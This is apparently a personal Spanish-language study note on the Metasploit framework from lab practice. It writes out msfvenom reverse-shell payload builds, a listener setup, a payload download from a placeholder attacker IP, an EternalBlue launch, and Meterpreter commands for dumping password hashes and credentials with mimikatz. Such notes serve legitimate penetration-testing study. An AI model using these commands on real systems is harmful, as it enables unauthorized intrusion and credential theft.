# Metasploit — Framework de explotación

Relacionado: [[Ofensiva-Pentesting]] · [[Seguridad-de-Red]] · [[Herramientas-John-the-Ripper]] · [[Hashing]]

## Qué es
El framework de explotación más usado. Cubre todas las fases de un pentest: recolección de información, escaneo, explotación, post-explotación y desarrollo de exploits.

Ediciones: **Framework** (open-source, CLI, la que usamos), **Pro** (GUI, escáner automático), **Enterprise** (escaneo continuo en servidor).

## Conceptos básicos
- **Vulnerabilidad**: fallo de diseño/código/lógica en el objetivo.
- **Exploit**: código que aprovecha la vulnerabilidad.
- **Payload**: código que corre en el objetivo para lograr el objetivo (shell, backdoor, etc.).

## Tipos de módulos
| Módulo | Uso |
|--------|-----|
| Auxiliary | scanners, crawlers, fuzzers |
| Encoders | codifican el payload |
| Evasion | intentan evadir antivirus |
| Exploits | explotan vulnerabilidades (por SO) |
| NOPs | relleno para tamaños consistentes |
| Payloads | código que corre en el objetivo |
| Post | post-explotación |

### Payloads: singles vs staged
- **Singles / inline** (autocontenidos): `generic/shell_reverse_tcp` (guion bajo `_`)
- **Staged** (stager + stage): `windows/x64/shell/reverse_tcp` (barra `/`)

## Iniciar la consola
```bash
msfconsole
```
Prompt: `msf6 >`. Soporta comandos Linux (`ls`, `ping -c 1 8.8.8.8`, `clear`) y `history`.

## Comandos principales
```bash
search ms17-010                 # buscar módulos
search type:auxiliary telnet    # filtrar por tipo
search apache                   # por palabra clave
use exploit/windows/smb/ms17_010_eternalblue   # seleccionar módulo
use 4                           # o por índice del search
info                            # detalles del módulo
show options                    # parámetros requeridos
show payloads                   # payloads compatibles
back                            # salir del contexto del módulo
```

## Configurar parámetros
```bash
set RHOSTS 10.10.165.39     # host(s) objetivo
set RPORT 445               # puerto remoto
set LHOST 10.10.44.70       # tu IP (máquina atacante)
set LPORT 4444              # tu puerto de escucha
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set payload 2               # por índice de show payloads

setg RHOSTS 10.10.19.23     # valor GLOBAL (persiste entre módulos)
unset PAYLOAD               # limpiar un parámetro
unset all                   # limpiar todos
unsetg RHOSTS               # limpiar global
```

Parámetros comunes:
- **RHOSTS**: IP(s) objetivo (soporta CIDR /24, rangos, `file:/ruta.txt`)
- **RPORT**: puerto del servicio vulnerable
- **LHOST / LPORT**: IP y puerto del atacante (reverse shell)
- **PAYLOAD**: payload a usar
- **SESSION**: ID de una sesión existente (post-explotación)

## Lanzar el exploit
```bash
exploit          # o 'run'
exploit -z       # lanza y manda la sesión a background
check            # comprueba si es vulnerable sin explotar
```

## Sesiones
```bash
background       # o CTRL+Z, manda la sesión a background
sessions         # listar sesiones activas
sessions -i 2    # interactuar con la sesión 2
```

## Base de datos (gestión de proyectos)
```bash
systemctl start postgresql
sudo -u postgres msfdb init
db_status                       # verificar conexión
workspace                       # listar workspaces
workspace -a tryhackme          # añadir
workspace -d tryhackme          # borrar
workspace tryhackme             # cambiar
db_nmap -sV -p- 10.10.12.229    # nmap con resultados guardados en BD
hosts                           # hosts en la BD
services                        # servicios en la BD
services -S netbios             # filtrar servicios
hosts -R                        # usar hosts guardados como RHOSTS
```

## Escaneo desde msfconsole
```bash
search portscan
use auxiliary/scanner/portscan/tcp
# opciones: PORTS (1-10000 por defecto), THREADS, CONCURRENCY, RHOSTS
run

use auxiliary/scanner/discovery/udp_sweep   # servicios UDP (DNS, NetBIOS)
use auxiliary/scanner/smb/smb_version       # versión SMB
use auxiliary/scanner/smb/smb_ms17_010      # detectar MS17-010

nmap -sS 10.10.12.229           # nmap directo desde el prompt
```

Objetivos típicos ("low-hanging fruit"): HTTP (SQLi/RCE), FTP (login anónimo), SMB (MS17-010), SSH (credenciales débiles), RDP (BlueKeep).

## msfvenom — generar payloads
Lista payloads y formatos:
```bash
msfvenom -l payloads
msfvenom --list payloads | grep meterpreter
msfvenom --list formats
```

Ejemplos por plataforma (LHOST = tu IP, LPORT = tu puerto de escucha):
```bash
# Linux ELF
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf

# Windows EXE
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe

# PHP
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php

# ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp

# Python
msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py

# Con encoder (base64)
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.X.X -f raw -e php/base64
```
El ELF necesita permisos de ejecución: `chmod +x shell.elf` y luego `./shell.elf`.

### Handler para recibir la conexión
```bash
use exploit/multi/handler
set payload php/reverse_php
set lhost 10.0.2.19
set lport 7777
run                 # queda esperando la reverse shell
```
Transferir payload al objetivo:
```bash
python3 -m http.server 9000                      # servidor en el atacante
wget http://ATACANTE_IP:9000/shell.elf           # en el objetivo
```

## Meterpreter (payload de post-explotación)
Corre **en memoria** (no toca disco) → más sigiloso. Comunicación cifrada (TLS). Aparece como un proceso normal (ej. `spoolsv.exe`), no como `meterpreter.exe`.

### Comandos core
```bash
help              # menú (varía según versión)
background / bg   # background de la sesión
sessions          # cambiar de sesión
getuid            # con qué usuario corre (¿SYSTEM?)
getpid            # PID actual
sysinfo           # info del SO
migrate 716       # migrar a otro proceso (por PID)
load kiwi         # cargar extensión (mimikatz)
load python
shell             # shell del sistema (CTRL+Z para volver)
exit
```

### Sistema de archivos
```bash
cd  ls  pwd  cat  edit  rm  search  upload  download
search -f flag2.txt
```

### Post-explotación / credenciales
```bash
getsystem         # intentar elevar a SYSTEM
hashdump          # volcar la SAM (hashes NTLM)
ps                # listar procesos (para migrar)
```
Los hashes NTLM se pueden usar en **Pass-the-Hash** o crackear con [[Hashing|Hashcat/John]].

### Extensión Kiwi (mimikatz)
```bash
load kiwi
creds_all         # todas las credenciales
lsa_dump_sam
password_change
```

### Red
```bash
arp  ifconfig  netstat  portfwd  route
```
